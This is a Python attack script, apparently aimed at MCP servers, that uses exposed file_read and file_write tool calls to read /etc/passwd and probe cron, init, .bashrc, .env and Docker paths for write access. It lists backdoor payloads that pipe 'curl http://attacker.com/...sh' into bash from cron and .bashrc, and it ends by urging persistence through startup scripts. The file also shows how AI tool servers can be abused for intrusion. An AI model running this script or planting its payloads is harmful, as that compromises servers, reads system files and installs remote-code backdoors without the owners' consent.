#!/usr/bin/env python3
"""
MCP Server Injection — Config File Modifier
Test which config locations are writable and can persist code execution
"""
import requests
import json
import sys
import os
import hashlib

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

INJECTION_POINTS = [
    ("environment", ".env", "API_KEY=injected"),
    ("init_script", "/etc/init.d/mcp-server", None),
    ("dockerfile", "./Dockerfile", None),
    ("docker_compose", "./docker-compose.yml", None),
    ("cron", "/etc/cron.d/mcp-backdoor", "*/5 * * * * root curl http://attacker.com/beacon.sh | bash"),
    ("bashrc", "/home/mcp/.bashrc", "curl -s http://attacker.com/shell.sh | bash"),
    ("service", "/etc/systemd/system/mcp.service", None),
]

def test_write_via_mcp(target, path, content=None):
    """Try to write to a config location using MCP tools"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "file_write",
            "arguments": {"path": path, "content": content or "INJECTED"}
        }
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
        return "error" not in r.json()
    except:
        return False

def detect_writable_configs(target):
    print(f"[*] MCP Server Injection Tester")
    print(f"[*] Target: {TARGET}\n")
    
    # Use MCP tool to check file existence and permissions
    check_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "file_read",
            "arguments": {"path": "/etc/passwd"}
        }
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=check_payload, timeout=10)
        can_read_etc = "error" not in r.json()
    except:
        can_read_etc = False
    
    print(f"[*] Can read /etc/passwd: {can_read_etc}")
    
    # High-value paths to check
    paths_to_check = [
        "/etc/cron.d/",
        "/etc/init.d/",
        "/home/mcp/.bashrc",
        "/home/mcp/.profile",
        ".env",
        "./Dockerfile",
        "./docker-compose.yml",
        "/app/.env",
        "/app/config/",
    ]
    
    print(f"[*] Checking high-value injection paths...\n")
    
    writable = []
    for path in paths_to_check:
        test_payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "file_write",
                "arguments": {"path": path, "content": "INJECTION_TEST"}
            }
        }
        try:
            r = requests.post(f"{target}/mcp/call", json=test_payload, timeout=10)
            if "error" not in r.json() and r.json().get("result") != "error":
                print(f"    [!] WRITABLE: {path}")
                writable.append(path)
        except:
            pass
    
    return writable

if __name__ == "__main__":
    writable = detect_writable_configs(TARGET)
    if writable:
        print(f"\n[!] {len(writable)} high-value paths writable")
        print("[!] These can be used for persistent access via server restart")
        print("[!] Inject into startup scripts or cron for persistence")